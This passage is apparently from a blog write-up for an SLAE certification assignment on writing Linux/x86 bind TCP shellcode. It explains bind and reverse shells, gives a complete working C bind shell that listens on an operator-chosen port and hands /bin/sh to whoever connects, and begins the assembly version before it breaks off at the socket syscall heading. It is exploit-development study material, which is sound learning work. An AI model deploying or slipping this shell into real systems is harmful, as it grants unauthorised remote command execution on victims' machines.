# SLAE Exam Assignment 1 - Creating a Bind TCP shellcode

## Prologue
The first assignment for the SLAE certification exam is creating a Bind TCP shellcode for Linux/x86 architecture using the shellcoding knowledge that we have accumulated from the SLAE course and from our self-learning process.

So without any further ado, let's get down with it shall we?

## So what is Bind TCP anyway?
Let's take a look at a visual representation first and then we shall get down to the details.

![Bind TCP Overview](../assets/images/bind_tcp_overview.png "Bind TCP Overview")

As is illustrated by the image, the victim/target machine opens a port and listens or waits for an incoming connection request by the attacker who then connects to it. After a connection is established successfully between them, the target can now execute any abritary command as instructed by the attacker machine.

In other words, the victim is running the TCP server and the attacker is running the TCP client code.

An important point to remember is that this whole situation **reverses in a Reverse TCP shell.**

So how is this useful in the context of Information Security?

Honestly, bind shells are not that useful in a pen-testing scenario because for one firewalls have very strict inbound traffic filtering rules so inbound traffic from an unknown attacker's IP will probably be blocked and the shell won't be functioning. A Reverse TCP shell is what we use almost always in a pen-testing engagement as a workaround for this problem. You can find more information about this in the next blog post.

## A C Prototype first
If we are going to program in something as low-level as machine code it is only fair that we first create a prototype in a high-level language like C/C++ to conceptualize it and get a template for creating our assembly code right?

```c
// Filename: bind_tcp.cpp
// Author: Upayan a.k.a. slaeryan
// Purpose: This is a x86 Linux bind TCP shell written in C/C++ that inputs
// the C2 port from the console by the operator.
// Usage: ./bind_tcp 8080
// Compile with:
// g++ bind_tcp.cpp -o bind_tcp
// Testing: nc -v localhost 8080

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

//#define C2_PORT 8080

int main(int argc, char const *argv[]) 
{
    // Console C2 Port input from operator
    char* c2portstring = (char*)argv[1];
    int C2_PORT = atoi(c2portstring);
    // Declaring a sockaddr_in struct and an int var for socket file descriptor
    struct sockaddr_in server;
    int sockfd;
    // Initializing the sockaddr_in struct
    server.sin_family = AF_INET;           
    server.sin_addr.s_addr = INADDR_ANY;  
    server.sin_port = htons(C2_PORT);
    // 1st Syscall for creating the socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);        
    // 2nd Syscall for binding the socket
    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
    // 3rd Syscall to listen for connections
    listen(sockfd, 0);
    // 4th Syscall to accept incoming connections
    int conn_sock = accept(sockfd, NULL, NULL);
    // 5rd Syscall for dup2()
    dup2(conn_sock, 0); // STDIN
    dup2(conn_sock, 1); // STDOUT
    dup2(conn_sock, 2); // STDERR
    // 6th Syscall for execve()
    execve("/bin/sh", 0, 0);
    return 0;
}
```

And here is a fully-functional C source for a bind shell payload. Stripping the C code down to it's essential details, we note the following syscalls to be made in our assembly code:

1. socket
1. bind
1. listen
1. accept
1. dup2
1. execve

Wonderful! Now let's get started with recreating the payload in ASM.

## Creating the Assembly program
### Clearing registers
The first set of instructions are almost always the same which is clearing the register sets we will be using in our program.

```nasm
; Clearing the first 4 registers for 1st Syscall - socket()
xor eax, eax       ; May also sub OR mul for zeroing out
xor ebx, ebx       ; Clearing out EBX 
xor ecx, ecx       ; Clearing out ECX
cdq                ; Clearing out EDX 
```

Note that we didn't use XOR'ing for clearing the EDX register instead we used `cdq` which actually copies the sign bit of EAX register into each bit position in EDX register essentially clearing it out. This saved us 1 byte in the process ;)
### Socket syscall

